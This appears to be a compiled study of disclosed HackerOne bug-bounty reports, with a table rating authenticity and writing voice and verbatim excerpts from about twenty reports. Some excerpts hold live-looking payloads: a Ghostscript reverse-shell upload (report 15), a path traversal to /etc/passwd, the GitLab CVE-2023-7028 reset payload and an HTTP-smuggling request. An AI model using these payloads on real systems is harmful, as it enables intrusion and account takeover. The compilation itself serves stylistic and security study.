| 61 | [2762119](https://hackerone.com/reports/2762119) | odaysec | DotNetNuke DNNPersonalization cookie XML/type deserialization (CVE-2017-9822) -> RCE | Textbook CVE reproduction against a live target (lonidoor.mtn.ci) with two tiered, fully reproducible ysoserial.net payloads and raw HTTP request/response evidence. | direct | genuine |  |
| 62 | [164224](https://hackerone.com/reports/164224) | yaworsk | Server-side template injection (Smarty) via profile fields -> PHP code execution -> RCE | Clean incremental SSTI-to-RCE escalation narrative ({7*7} -> version disclosure -> {php} tag confirmation -> file_get_contents exfiltration) with a personable, first-name sign-off. | direct | genuine |  |
| 63 | [2633771](https://hackerone.com/reports/2633771) | root_geek280 | IDOR on HackerOne's own AddTagToAssets GraphQL mutation | IDOR against HackerOne's own GraphQL API (AddTagToAssets), reported by a hacker against the platform itself; body text contains genuine platform-applied redaction artifacts, not fabricated ones. | direct | nonnative |  |
| 64 | [2528293](https://hackerone.com/reports/2528293) | moblig | IDOR (Insecure Direct Object Reference) — GitLab ML Model Registry, incremental/guessable model IDs exposing private models |  | direct | genuine |  |
| 65 | [3154983](https://hackerone.com/reports/3154983) | z3phyrus | IDOR (session misbinding) — Mozilla Firefox Accounts /account/destroy lets an attacker delete a victim's account by supplying their email+authPW hash under the attacker's own session |  | direct | genuine |  |
| 66 | [3085742](https://hackerone.com/reports/3085742) | bugbountywithmarco | IDOR — Bykea legacy/'zombie' in-app endpoint leaking other users' trip and driver details without ownership validation |  | direct | genuine |  |
| 67 | [2487889](https://hackerone.com/reports/2487889) | bate5a | IDOR — HackerOne's own /bugs.json endpoint let any authenticated user pull private report metadata (title, id, state, severity, reporter) for an arbitrary organization by ID |  | direct | nonnative |  |
| 68 | [391092](https://hackerone.com/reports/391092) | hk755a | IDOR (fraud / free-order) — Yelp/Grubhub checkout endpoint let an attacker substitute another user's credit_card_id to pay with their saved card |  | direct | nonnative |  |
| 69 | [950881](https://hackerone.com/reports/950881) | bugra | IDOR leading to account takeover — Automattic/Atavist email-change endpoint trusted a client-supplied sequential user id parameter, letting anyone change any account's email then reset the password |  | direct | genuine |  |
| 70 | [2831902](https://hackerone.com/reports/2831902) | db3wy | Account takeover (0-click, password reset) | 0-click ATO via a password-reset endpoint (/orchestrator/v1/password_reset/start) that leaks a JWT plus session identifiers (AMP_d0cf3ed24c) belonging to whichever user's reset happens to hit it; attacker splices those values into their own in-flight reset request to hijack the victim's account. Critical severity at Remitly (a money-transfer service), 276 upvotes, no bounty listed. | direct | nonnative | Extremely granular, almost stream-of-consciousness reproduction steps (numbered '1-----', '2-----' etc.) written by someone clearly narrating their own trial-and-error discovery process in real time, including a tool recommendation ('Burp Suite... JSON Web Token' extension) and an admission the exploit didn't work on the first try. |
| 71 | [3178999](https://hackerone.com/reports/3178999) | boy_child_ | Account takeover (SCIM provisioning) | ATO on HackerOne's own program via SCIM/SSO provisioning: an attacker with a verified SSO domain can import an org's existing users into Okta, reassign a victim's H1 account to an attacker-controlled Okta user, flip the email field to an attacker address (no notification sent), then trigger a password reset (also silent) to fully take over the account -- includes the finding that every sandbox/org ships with default demo-member/demo-triager accounts that are always exploitable this way. | direct | genuine | Reads as a first-person research narrative rather than a report template -- walks through a wrong initial hypothesis, the pivot that made the attack work, a moment of disbelief ('I then thought this looked too easy'), and closes with a personal regret about a deleted test sandbox. |
| 72 | [1923672](https://hackerone.com/reports/1923672) | bull | Account takeover (SAML RelayState/CSRF) | Chains a SAML RelayState open redirect (persisted via a GitLab logout CSRF + resent SAML request) with GitLab's stored OAuth 'import project' integrations (Bitbucket, GitHub, Salesforce, Twitter) to steal third-party OAuth access tokens via implicit-grant redirect hijacking -- weaponized into a documented one-click HTML PoC. $2,450 bounty, medium severity at GitLab. | direct | nonnative | Opens like a personal email ('Hi,') and closes with a first-name signature and an offer to keep test credentials live for the triager -- reads as a direct one-to-one message to the security team rather than a formal disclosure document. |
| 73 | [810880](https://hackerone.com/reports/810880) | w2w | Account takeover (2FA linking bypass) | Two chained auth flaws in Helium's 2FA API: (1) /api/2fa lets an attacker link their own 2FA device to any victim's account by substituting the victim's user ID in the linking request when the victim hadn't set up 2FA yet, and (2) /api/2fa/verify accepts a valid 2FA code plus a bare user ID with no session/token binding -- combined, a full silent takeover of any 2FA-less account. Medium severity, $100 bounty. | direct | nonnative | Compact, two-bug chain explained in a few tight paragraphs with a friendly opening greeting, and an unedited stray period mid-sentence ('we. don't use tokens') that betrays real-time typing rather than a polished draft. |
| 74 | [1114347](https://hackerone.com/reports/1114347) | akashhamal0x01 | Account takeover (stale verification token) | Stale-token ATO at Mattermost: changing account email to address A, then changing again to address B before verifying A, still leaves A's verification link live; anyone with access to mailbox A can use the never-invalidated link to re-associate the account and take it over even after the user moved on to a different, verified address. Low severity, no bounty listed. | direct | nonnative | Opens with a warm, informal greeting complete with a smiley emoticon before walking through the bug as a little story about a user who 'mistyped' their email -- a strikingly friendly register for a security disclosure to a company's triage team. |

## Per-report verbatim excerpts

### 1. francisbeaudoin — account-takeover / authentication-logic (report 867513)

https://hackerone.com/reports/867513

Voice: pronoun I; em-dash no; contractions yes. Signs off casual encouragement mid-triage with an emoticon: 'I really appreciate working with you guys :)'

> **title:** Takeover an account that doesn't have a Shopify ID and more

> **summary:** A report from @francisbeaudoin showed that it was possible to bypass Shopify's email verification for a small subset of Shopify user accounts. Doing so would have allowed a user to access accounts they did not own.

> **rootcause:** The https://pos-channel.shopifycloud.com/graphql-proxy/admin can be exploited to update a staff member email without any email confirmation.

> **steps:** Have a victim with a shop that doesn't have a Shopify ID

> **steps:** Save your own staff page and copy the CURL request by using browser inspection

> **impact:** That vulnerability has multiple impacts so I wasn't sure if I should've been creating multiple reports

> **comment:** As a FYI, in the video, the victim's store was also a development store (created in a separate partner account) to make sure that the shop owner "StaffMember" object isn't attached to any account on accounts.myshopify.com, which I believe is a Shopify ID.

> **comment:** I made some testing of the preliminary fix for the email change and it does look good! You guys are quite efficient and I really appreciate working with you guys :)

> **severity:** Critical (9 ~ 10)

> **supporting:** Thanks again for your report. We're awarding a bounty of $22,500 for this report because this could have allowed someone to merge their development store with a targeted user's single sign-on account to access that account.

### 2. albinowax — stored-XSS via cache poisoning (HTTP request smuggling) (report 510152)

https://hackerone.com/reports/510152

Voice: pronoun I; em-dash no; contractions yes. Treats the HackerOne report body as a formality, deferring entirely to his own blog: 'I've posted a full writeup over at...' — no further elaboration in-platform.

> **title:** Bypass for #488147 enables stored XSS on https://paypal.com/signin again

> **summary:** Due to a configuration in frontend, caching servers, it was possible for a researcher to use request smuggling to convert a page request into a cached redirect. If the cached redirect were accessed by a legitimate user, an attacker's content would be rendered instead of the requested page.

> **summary:** I've posted a full writeup over at https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn

> **severity:** High (8.7)

> **supporting:** rewarded albinowax with a $18,900 bounty

> **other:** Weakness: HTTP Request Smuggling

### 3. ngalog — authentication bypass / privilege escalation (SSO account takeover) (report 791775)

https://hackerone.com/reports/791775

Voice: pronoun I; em-dash no; contractions yes. Signs comments with his real first name 'Ron' and jokes about the double bounty: 'No one can complain anything if they can get two bounties for one bug =P'

> **title:** Email Confirmation Bypass in myshop.myshopify.com that Leads to Full Privilege Escalation to Any Shop Owner by Taking Advantage of the Shopify SSO

> **summary:** On February 9th, @ngalog reported that it was possible to bypass Shopify's email verification for a small subset of Shopify user accounts.

> **rootcause:** The bug is that Shopify email system mistakenly send the confirmation link of the new email address, to the one that is used to signed up.

> **steps:** All done now, grab a coffee, sit back and relax, watch some YouTube videos and wait for an email to go to your email attacker@gmail.com

> **impact:** Ability to confirm arbitrary email on *.myshopify.com and leverage SSO to set master password for all other stores under the same password

> **comment:** I wasn't using the most accurate words while describing the impact, it could be more than just be taking over other stores , but also the partner account as well since they are all tied together

> **comment:** No one can complain anything if they can get two bounties for one bug =P

> **comment:** Thank you very much for the bounty, and also the quick response time and the conversation here, and the 100% transparency in this report. Really enjoy working with Shopify team.

> **supporting:** We're awarding a $15,000 bounty under the "Privilege escalation to shop owner" category for Shopify Core.

### 4. Haxta4ok00 — account-takeover (leaked session cookie / staff privilege exposure) (report 745324)

https://hackerone.com/reports/745324

Voice: pronoun I; em-dash no; contractions yes. Writes in genuinely broken English throughout a critical incident about breaking into HackerOne's own staff tooling: 'I am can use your session(sorry)'

> **title:** Account takeover via leaked session cookie

> **summary:** Summary: You are disclose for me you session Description: you are gevi me your session on last report I am can use your session(sorry)

> **impact:** HackerOneStaff Access, i can read all reports @security and more program

> **comment:** Hi @jobert -- I did it to show the impact. I didn't mean any harm by it.I reported it to you at once. I was not sure that after the token substitution I would own all the rights. I apologize if I did anything wrong. But it was just a white hack

> **comment:** Three years ago I mentioned such an attack, but it was theoretical and I was not listened to( here #163381 I wrote in theory find this in the future)

> **comment:** And sorry if I that the poorly translated, hope you me will understand. Thanks @jobert again.

> **comment:** Hi @jobert -- Thanks for the bounty! This is a very large sum for me. My PayPal has in my country a certain limit per month, if I can not get the whole amount at once, it will be possible to divide it into several parts in the future?

> **rootcause:** The Security Analyst replied to the hacker, accidentally including one of their own valid session cookies.

> **supporting:** we've decided to award $20,000 for making us aware of the disclosed session cookie!

### 5. augustozanellato — secrets exposure (leaked GitHub token) (report 1087489)

https://hackerone.com/reports/1087489

Voice: pronoun I; em-dash no; contractions yes. Reacts to the $50,000 payout with genuine disbelief: 'Ok, I'm officially speechless, I wasn't expecting a bounty so big!'

> **title:** Github access token exposure

> **summary:** I was reviewing an Electron app made by one of Shopify employees (at the time I didn't know that Shopify was in any way involved), after extracting the app.asar file using npx asar extract path/to/app.asar extracted/path I found a .env file, initially I skipped it because I thought it just contained some app configuration stuff but after taking a look at the source it was clear that the app never loaded it.

> **rootcause:** so at that point I knew that the token was enabling me to perform arbitrary push and pulls to Shopify repos so potentially permitting me to place backdoors and such.

> **steps:** As a proof I can tell you that on the repo github.com/Shopify/shopify at commit hash cea9c273391d the sha512 of the README.md is 69750574bec56c1f1052db3471252b1daacdc9dda9f6d5332a3400a847fa413ec1caf19ef0b5501f18a5a76c232e7210d5f3b91c24c9439f4e0f64c02d6db824.

> **comment:** the actions performed on the Shopify org were limited to GET /orgs/Shopify/repos in order to list the repos and I tried to actually start some clones because I couldn't believe it was real :P.

> **comment:** Ok, I'm officially speechless, I wasn't expecting a bounty so big! Big thanks to all the Shopify security team, looking forward to open more reports here!

> **severity:** Critical (10.0)

> **supporting:** our investigation concluded that this token was able to write to a majority of Shopify's GitHub repositories and therefore could potentially deploy code on to Shopify infrastructure. For this reason, we're awarding a $50,000 bounty for this issue.

### 6. vakzz — path traversal / arbitrary file read (escalated to RCE) (report 827052)

https://hackerone.com/reports/827052

Voice: pronoun I; em-dash no; contractions yes. Signs off two separate technical escalation comments with the casual 'Cheers,\nWill' despite the content being a full weaponized RCE exploit chain.

> **title:** Arbitrary file read via the UploadsRewriter when moving and issue

> **summary:** The UploadsRewriter does not validate the file name, allowing arbitrary files to be copied via directory traversal when moving an issue to a new project.

> **steps:** ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)

> **impact:** Allows an attacker to read arbitrary files on the server, including tokens, private data, configs, etc

> **comment:** Affects gitlab.com as well, example of a moved issues that copies /etc/passwd at https://gitlab.com/vakzz-h1-group-1/dest/-/issues/2

> **comment:** It's possible to turn this into an RCE as the cookies_serializer is set to :hybrid by default.

> **comment:** Thanks for the triage payment and for the updates!

> **rootcause:** As there is no restriction on what file can be, path traversal can be used to copy any file.

> **supporting:** Your finding has been patched in GitLab version 12.9.1 and we are awarding a bounty.

### 7. alexbirsan — Information disclosure via XSSI (cross-site script inclusion) token leak enabling PayPal account credential exposure (report 739737)

https://hackerone.com/reports/739737

Voice: pronoun impersonal; em-dash no; contractions no. The report body itself is fully redacted (visibility: no-content); all that is publicly visible is PayPal's own third-person incident summary plus a one-line pointer to Birsan's external write-up: 'Full write-up available here:'.

> **title:** Token leak in security challenge flow allows retrieving victim's PayPal email and plain text password

> **summary:** A bug was identified whereby sensitive, unique tokens were being leaked in a JS file used by the recaptcha implementation.

> **rootcause:** The researcher identified a method by which a user, starting from a malicious site, could expose the security challenge token to a third party via a cross-site script inclusion (XSSI) attack.

> **impact:** If the user then followed a login link from the malicious site and entered their credentials, the malicious third party could complete the security challenge, triggering the authentication request replay and exposing the user's password.

> **remediation:** PayPal implemented additional controls on the security challenge request to prevent token reuse, which resolved the issue, and no evidence of abuse was found.

> **comment:** Full write-up available here:  https://medium.com/@alex.birsan/the-bug-that-exposed-your-paypal-password-539fc2896da9?sk=aeba33c3c331c3f06d230296a21a41e7

### 8. vinnievan — Critical RCE via stack-based buffer overflow in the Steam client's native UDP server-info (A2S_PLAYER) parser (report 470520)

https://hackerone.com/reports/470520

Voice: pronoun we; em-dash no; contractions yes. Ends with a personal, informally signed-off byline naming both researchers by handle rather than a generic closing: 'Best regards,\nVinnie Vanhoecke @vinnievan and André Baptista @0xacb'.

> **title:** RCE on Steam Client via buffer overflow in Server Info

> **rootcause:** After a successful implementation of the protocol we fuzzed several parameters and noticed that the Steam client crashed when receiving replies from our custom server.

> **rootcause:** At some point the players’ name is converted into unicode and an overflow occurs because the boundaries are not checked. Also, there’s no canary protection present, which allowed us to overwrite the return address and execute arbitrary code on Windows.

> **steps:** 1 - Download the attachment: {F395515} 2 - Use a debugger like Immunity Debugger and attach to Steam.exe

> **steps:** 4 - Run the exploit on a server of your choice (e.g. localhost): `python steam_serverinfo_exploit.py`

> **supporting:** **Steamclient_POC_Windows10.mp4**: Contains a video of the exploit being triggered on Windows 10 via manual interaction with the Steam server browser

> **impact:** An attacker can execute arbitrary code on the computer of any Steam user who views the server info of our malicious server.

> **impact:** Only 9 bits are randomized: An attacker can successfully exploit a victim with a probability of 0.2% (1/512), which is more than enough if we are talking about an attacker distributing this exploit massively to all Steam users (1 new victim every 512 attempts in average)

> **other:** Best regards, Vinnie Vanhoecke @vinnievan and André Baptista @0xacb

### 9. orange — Pre-auth RCE chain on Pulse Secure SSL VPN (arbitrary file read + 2FA bypass + post-auth command injection) demonstrated against Twitter's VPN (report 591295)

https://hackerone.com/reports/591295

Voice: pronoun we; em-dash no; contractions yes. Signs off the researcher comment with a smiley emoticon addressed directly to the target's security team: 'Thanks Twitter Security Team again :)'.

> **title:** Potential pre-auth RCE on Twitter VPN

> **summary:** Hi, we(Orange Tsai and Meh Chang) are the security research team from DEVCORE. Recently, we are doing a research about SSL VPN security, and found several critical vulnerabilities on Pulse Secure SSL VPN!

> **summary:** Since that, we keep monitoring numerous large corporations using Pulse Secure and we noticed that Twitter haven't patched the SSL VPN server over one month!

> **rootcause:** These vulnerabilities include a pre-auth file reading(CVSS 10) and a post-auth(admin) command injection(CVSS 8.0) which can be chained into a pre-auth RCE!

> **steps:** First, we download following files with CVE-2019-11510: 1. `/etc/passwd` 2. `/etc/hosts` 3. `/data/runtime/mtmp/system`

> **steps:** Once we log into the SSL VPN, we found the server has enabled the Two-Factor Authentication. Here, we listed two methods to bypass the 2FA:

> **impact:** 1. Access Intranet(we have accessed the `████████` for proof) ████ 2. Plenty of staff plain-text passwords 3. Internal server and passwords(such as the LDAP)

> **remediation:** The only and simplest way to solve this problem is to upgrade your SSL VPN to the [latest version](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101)!

> **comment:** Thanks Twitter Security Team again :) The details can be found here!

### 10. txt3rob — Unauthenticated exposed Kubernetes API leading to cluster-admin RCE and internal credential exposure (report 455645)

https://hackerone.com/reports/455645

Voice: pronoun I; em-dash no; contractions no. The entire disclosed researcher account of a $25,000 critical, cluster-admin-level RCE is only two casual sentences, typed with a lowercase 'i': 'During a worldwide kubernetes scan with binaryedge.io i found a K8 exposed internal API endpoint...'.

> **title:** Exposed Kubernetes API - RCE/Exposed Creds

> **summary:** @txt3rob found one of Snaps internal Kubernetes instances exposing an API endpoint without authorization to the public.

> **impact:** With access to this API he was able to run arbitrary code/jobs as a cluster-admin and gained access to credentials with internal access to a significant number of instances.

> **rootcause:** During a worldwide kubernetes scan with binaryedge.io i found a K8 exposed internal API endpoint without authorization to the public.

> **impact:** With access to this API I was able to run arbitrary code/jobs as a cluster-admin and gained access to credentials with internal access to a significant number of instances.

### 11. yashrs — GraphQL authorization bypass exposing user PII and internal program/report metadata via the `nodes` connection field (report 489146)

https://hackerone.com/reports/489146

Voice: pronoun mixed; em-dash no; contractions yes. The vulnerable target is HackerOne itself, and co-founder Jobert Abma personally authored the public postmortem, complete with a minute-by-minute incident-response timeline table.

> **title:** Confidential data of users and limited metadata of programs and reports accessible via GraphQL

> **summary:** The GraphQL endpoint doesn't have access controls implemented properly.

> **rootcause:** Any attacker can get personally identifiable information of users of Hackerone such as email address, backup hash codes, facebook_user_id, account_recovery_phone_number_verified_at, totp_enabled, etc.

> **comment:** Please fix it. Thanks, Yash :)

> **rootcause:** The [class-based implementation introduced](http://graphql-ruby.org/schema/class_based_api) the `nodes` field by default on all connections. The `nodes` field, in contrast with `edges`, didn’t leverage any of the defenses HackerOne has implemented to mitigate the exposure of sensitive information.

> **other:** | 2019-01-31 | 7:21 PM | HackerOne validated the report and started incident response. |

> **remediation:** The short-term mitigation was to disable the `nodes` field [from every connection type](https://github.com/arkadiyt/bounty-targets-data/commit/dd90f110609bff572f15b62d29701195a3c2b3bf#diff-8f06618eaa831640dfc824ff0cc29ebd). An internal code rule was deployed to alert the incident responders in case a new connection type was added that had the `nodes` field enabled.

> **severity:** Because of that, the team decided to award the reporters with $20,000 for uncovering this vulnerability and working with us throughout the process.

### 12. korniltsev — Improper authentication / IDOR-style account takeover via OTP logout+login endpoints trusting a client-supplied user_id (report 921780)

https://hackerone.com/reports/921780

Voice: pronoun mixed; em-dash no; contractions yes. Written almost entirely in an impersonal third-person 'attacker'/'victim' frame, with one casual first-person slip and a grammar quirk ('the server responded ... and given us otp token') betraying non-native English.

> **title:** Improper Authentication - any user can login as other user with otp/logout & otp/login

> **rootcause:** '/scauth/otp/droid/logout' request contains user_id parameter. Usually it is equal to current user user_id, but if an attacker passes user_id of victim account he can login as victim.

> **steps:** Attacker performs `/scauth/otp/droid/logout` but instead of attacker's user_id, attacker provides victim's user_id

> **steps:** Notice an attacker replaced user_id with victim's user_id and the server responded with victim's user_id and given us otp token. Now let's login with the token.

> **steps:** Attacker performs `/scauth/otp/login` request with username equal victim's username, and the token obtained on previous step.

> **impact:** An attacker successfully performed login as victim. Victim's user_id can be easily obtained with friends request.

> **impact:** An attacker is able to  login as any user.

> **summary:** This vulnerability was discovered on the One Tap Password (OTP) login/logout flow. If exploited, the attacker could log in to any account for which they had the user_id.

### 13. asterion04 — account-takeover (password reset logic, CVE-2023-7028) (report 2293343)

https://hackerone.com/reports/2293343

Voice: pronoun I; em-dash no; contractions no. A small grammar slip ('reset link that was send to both emails') is the clearest tell of a non-native English speaker in an otherwise terse, purely procedural report.

> **title:** Account Takeover via Password Reset without user interactions

> **summary:** I found a way to change the password of a GitLab account via the password reset form and successfully retrieve the final reset link without user interactions, using just its email address.

> **steps:** Go to "Forgot Your Password?" link Enter the victim's email and intercept the submit request via Burp Suite .

> **steps:** Then right-click on the HTTP Editor inside Burp Suite and select Extensions -> Content-Type Converter -> Convert to JSON (make sure to have the Content-Type Converter plugin installed from the BApp Store)

> **steps:** Now replace this converted JSON line `` "user[email]":"victim@gmail.com"``, to ```  "user" {      "email" [               "victim@gmail.com",               "attacker@gmail.com"        ]  }, ```

> **steps:** Forward the requests and you should get an email containing the reset link that was send to both emails (``victim@gmail.com`` and ``attacker@gmail.com``) .

> **impact:** By just knowing the victim email address used on GitLab, you can takeover his account by changing his password without user interaction since the attacker get the same email as the victim.

> **supporting:** $35,000

### 14. defparam — HTTP request smuggling -> mass account-takeover (report 737140)

https://hackerone.com/reports/737140

Voice: pronoun I; em-dash no; contractions yes. An emoticon (':)') and a folksy sign-off ('Have a nice day!') sit oddly alongside a critical-severity HTTP desync exploit chain — the tone reads more like a friendly email than a formal vulnerability disclosure.

> **title:** Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies

> **summary:** Hi Slack Security Team! My name is Evan and I'm a first time bug hunter to your platform :) Because you guys were running a month long bounty promotion I decided to take a little of my time and gently perform recon on your platform.

> **rootcause:** The CLTE issue found on slackb.com is when the frontend server interprets the request sized using `Content-Length` and the backend server interprets the request using the `Transfer-Encoding: chunked` method. This causes a desync on the webrequest and can poison the backend socket causing data to be pre-pended to the next webrequest from a victim.

> **steps:** 1) Open up a fresh Burp 2) Open up a fresh Collaborator by going to menu: `Burp->Burp Collaborator Client` 3) In the Collaborator Client click on `Copy to clipboard` for the server URL

> **steps:** GET / HTTP/1.1 Transfer-Encoding : chunked Host: slackb.com User-Agent: Smuggler/v1.0 Content-Length: 83 0 GET <URL> HTTP/1.1 X: X

> **impact:** So it is my opinion that this is a severe critical vulnerability that could lead to a massive data breach of a majority of customer data. With this attack it would be trivial for a bad actor to create bots that consistantly issue this attack, jump onto the victim session and steal all possible data within reach.

> **comment:** I am really happy I found this for you guys so that it can be dealt with ASAP. I really hope there haven't been any attacks on customers using this vulnerability. Best Wishes, Evan

> **comment:** This researcher exploited an HTTP Request Smuggling bug on a Slack asset to perform a CL.TE-based hijack onto neighboring customer requests.

### 15. fransrosen — RCE via file upload (ImageMagick) (report 403417)

https://hackerone.com/reports/403417

Voice: pronoun I; em-dash no; contractions yes. The report retains HackerOne's own black-box redactions (███) inline with live command output ('whoami', 'cat /etc/hosts'), reading like an unedited terminal transcript rather than a polished summary.

> **title:** Remote Code Execution on www.semrush.com/my_reports on Logo upload

> **rootcause:** is passed through a not properly patched version of ImageMagick. You can use Postscript to get Ghostscript to run which in return allows to trigger arbitrary commands on the server, leading to Remote Code Execution.

> **steps:** The following PoC-payload was used to get a reverse shell when issuing the upload: Save it as `test.jpg` and upload it as an image for the logo: ``` %!PS userdict /setpagedevice undef legal { null restore } stopped { pop } if legal mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/███/8080 0>&1') currentdevice putdeviceprops ```

> **comment:** At this point I wasn't sure if this was a third party or not, so I checked two things:

> **supporting:** I navigated to  ``` https://www.semrush.com/my_reports/████ https://www.semrush.com/my_reports/████████ ``` And confirmed those two files exists in this directory.

> **remediation:** You should urgently make sure your policy.xml for imagemagick ONLY allows gif,jpg,png and nothing else.

> **comment:** Regards, Frans

### 16. malwaretech — info disclosure / narrative (WannaCry killswitch) (report 228648)

https://hackerone.com/reports/228648

Voice: pronoun impersonal; em-dash no; contractions no. The body is written entirely in third person about 'MalwareTech' rather than in his own first-person voice, marking it as a HackerOne-authored case-study rather than the hacker's own submission text.

> **title:** WannaCrypt “Killswitch”

> **summary:** WannaCrypt (a.k.a. WannaCry) is the name of a malware used in the May 2017 global ransomware attack targeting Microsoft Windows operating systems via known vulnerabilities leaked by The Shadow Brokers.

> **rootcause:** In MalwareTech's research, it was found that the malware sends an HTTP request to a seemingly random domain name in the early stages of its execution. If the HTTP call fails, the malware encrypts the user's files, requests ransom, and will spread to other vulnerable machines.

> **impact:** By registering the domain name, it was possible to make the malware's HTTP call return successfully. This resulted in the malware exiting early on new infections and effectively stopped this variant of the malware from spreading further.

> **supporting:** Original disclosure: https://www.malwaretech.com/2017/05/how-to-accidentally-stop-a-global-cyber-attacks.html

### 17. spaceraccoon — SQL injection (report 531051)

https://hackerone.com/reports/531051

Voice: pronoun I; em-dash no; contractions yes. The report is structured as a personal narrative arc with headers ('False Starts', 'The Lightbulb Moment', 'Assessing Impact', 'Takeaways') and breaks into a playful exclamation ('Zaheck!!') right at the climax of the exploit.

> **title:** SQL Injection Extracts Starbucks Enterprise Accounting, Financial, Payroll Database

> **summary:** As described in the Hacker Summary, @spaceraccoon discovered a SQL Injection vulnerability in a web service backed by Microsoft Dynamics AX.

> **other:** ## False Starts I first came across the endpoint via typical subdomain enumeration.

> **rootcause:** This time, I suspected that if the XML input was being entered into a database, I should test for SQL injections. In particular, the `MainAccount` looked promising because it accepted a numerical ID like `<MainAccount>123456</MainAccount>` and was perhaps used in a `WHERE` SQL query.

> **steps:** With a bit more manual testing, I realized it was possible to craft a time-based SQL injection. I then switched to `sqlmap` with the `--tamper htmlencode` flag to automate my attack. After a few minutes of anxious waiting, `sqlmap` confirmed the exploit and returned the database version: `Microsoft SQL Server 2012`. I was in!

> **impact:** There were almost a million entries up till the previous year that included real accounting information. Zaheck!! I immediately stopped testing and wrote my report.

> **comment:** 1. Don't get tunnel vision. Just because it's a file upload, don't focus solely on uploading a reverse shell. Just because it accepts XML files, don't focus solely on XXE. 2. Take notes and revisit old targets. Many of my best bugs were from vulnerabilities I found after revisiting an old endpoint.

> **comment:** Thank you Starbucks team and Hackerone triagers for responding quickly and communicating so well!

### 18. geekboy — subdomain takeover -> auth bypass (report 335330)

https://hackerone.com/reports/335330

Voice: pronoun I; em-dash no; contractions yes. Consistent lowercase 'i' for first-person and non-native grammatical constructions ('Apart form all above issue, attacker can do following things as well') mark this as a clearly non-native but genuine human writeup.

> **title:** Subdomain Takeover to Authentication bypass 

> **summary:** Due to unclaimed or expired Hubspot instance an attacker is able to claim and serve content from `devrel.roblox.com` and perform different kind of attacks which i shared in impact section.

> **steps:** ## Steps to Reproduce: ----------- + Visit: https://devrel.roblox.com/subdomain-takeover

> **rootcause:** As `.ROBLOSECURITY` cookies is scoped to `*.roblox.com` means same cookies shared with all other subdomain, i'm not much familiar with hubspot with hosting following code on will steal all the users cookie who visit this subdomain.

> **impact:** Also `devrel.roblox.com` can be used to read all the chats between other users as `devrel.roblox.com` is also white listed to make CORS request at chat.roblox.com

> **remediation:** ## Mitigation: ----------- + Remove the CNAME entry for the `devrel.roblox.com`

> **impact:** Apart form all above issue, attacker can do following things as well. + Creating fake login page for credentials harvesting. + Sharing malicious files using roblox. + Creating mail account using GSuite to send and recived emails on behalf of `*@devrel.roblox.com`

### 19. parsiya — RCE via local websocket origin-check bypass (Electron nodeIntegration + no Origin validation) - PlayStation Now (report 873614)

https://hackerone.com/reports/873614

Voice: pronoun I; em-dash no; contractions yes. Injects deadpan humor into a technical walkthrough — after showing RCE only pops calc on the attacker's own machine, he writes 'This is not that useful. We can run code on our own machine, WOW!' and quotes Raymond Chen's 'other side of this airtight hatchway' line twice (once in the analysis, once again as the closing impact statement), turning it into a running joke/thesis for the whole report.

> **title:** Websites Can Run Arbitrary Code on Machines Running the 'PlayStation Now' Application

> **summary:** The PlayStation Now application version `11.0.2` is vulnerable to remote code execution (RCE). Any website loaded in any browser on the same machine can run arbitrary code on the machine through a vulnerable websocket connection.

> **rootcause:** 1. The local websocket server at `localhost:1235` does not check the origin of incoming requests.     1. This allows websites loaded in browsers on the same machine to send requests to the websocket server.     2. Websockets are not bound by the Same-Origin Policy so the websocket server has to do this manually.

> **rootcause:** The AGL Electron application has `nodeIntegration: true` so JavaScript running in any loaded URL can spawn new processes.

> **steps:** 1. Run psnow in a VM. 2. Go to the following URL in a browser on the same machine:     1. https://[redacted].s3.amazonaws.com/agl-poc/calc-ws.html 3. Watch calc pop.

> **supporting:** I stole the client code of a websocket chat app and modified it to simulate the evil website. This small app connects to `ws://localhost:1235`, prints any message received and allows us to send messages at will.

> **supporting:** This is not that useful. We can run code on our own machine, WOW! As Raymond Chen said It rather involved being on the other side of this airtight hatchway.

> **supporting:** **WHAT IF** we switched target and source?

> **remediation:** Quick and effective win: The local websocket server should validate the `Origin` header of the incoming request and only allow requests from good Origins specified in a list.

> **impact:** Attackers can run code on users' machines. They can get to the other side of the airtight hatchway.

> **other:** If you have read up until here, you deserve a calc popping gif.

> **other:** Note: Running it in a Virtual Machine (VM) returns a warning. This can be ignored for this walkthrough.

### 20. lucash-dev — smart-contract logic flaw (validation bypass) in MakerDAO's flip.kick auction contract (report 684092)

https://hackerone.com/reports/684092

Voice: pronoun I; em-dash no; contractions yes. Uses a plain ASCII double-hyphen ('--') as an em-dash substitute for dramatic emphasis, e.g. 'steal ALL collateral ... during the liquidation phase -- possibly within a single transaction' — a stylistic tic repeated three times in the report.

> **title:** Steal ALL collateral during liquidation by exploiting lack of validation in `flip.kick`

> **summary:** A lack of validation in the method `flip.kick` allows an attacker to create an auction with a fake bid value.

> **rootcause:** The implementation of that method, however, completely lacks access control and has very little validation -- in particular, it's possible to execute the method even during the liquidation phase.

> **steps:** 1. Create a "fake" auction, by calling `flip.kick`. The bid parameter of the method can be set to any arbitrarily large value, in special a value at least equal to the total supply of DAI.

> **steps:** 2. The attacker calls `end.skip`. The `end` contract will try to return the `bid` amount to the attacker. This will result in the issuance -- for free -- of DAI to the attacker, in any amount entered during step 1.

> **impact:** The issue described in this report allows an attacker to steal ALL collateral stored in the MCD system during the liquidation phase -- possibly within a single transaction. This would result in a complete loss of funds for all users.

> **severity:** Given the above I understand the issue has Critical severity, and fully qualifies for the corresponding bounty.

> **supporting:** I've attached to this report a modified version of `end.t.sol` which contains a test (`test_steal_all_collateral_using_flipper`) that reproduces the attack.

> **comment:** Please don't hesitate to contact me if you need help understanding the test or reproducing the issue.

### 21. lauritz — account-takeover (OIDC/AWS Cognito misconfig) (report 1342088)

https://hackerone.com/reports/1342088

Voice: pronoun mixed; em-dash no; contractions no. Builds the narrative around explicitly labeled test personas (flickr-benign@... as '(our victim)', flickr-attacker@...) instead of generic placeholders, giving the writeup a small-scale case-study feel while remaining formal and contraction-free throughout.

> **title:** Flickr Account Takeover using AWS Cognito API

> **summary:** Flickr uses [Amazon Cognito](https://aws.amazon.com/de/cognito/) to implement its login functionality.

> **rootcause:** This restriction can be bypassed via direct communication with the Amazon Cognito *User Pool* API.

> **steps:** At first, the malicious actor needs to obtain an Amazon `access_token`. To do so, intercept the login request that is sent from https://identity.flickr.com/:

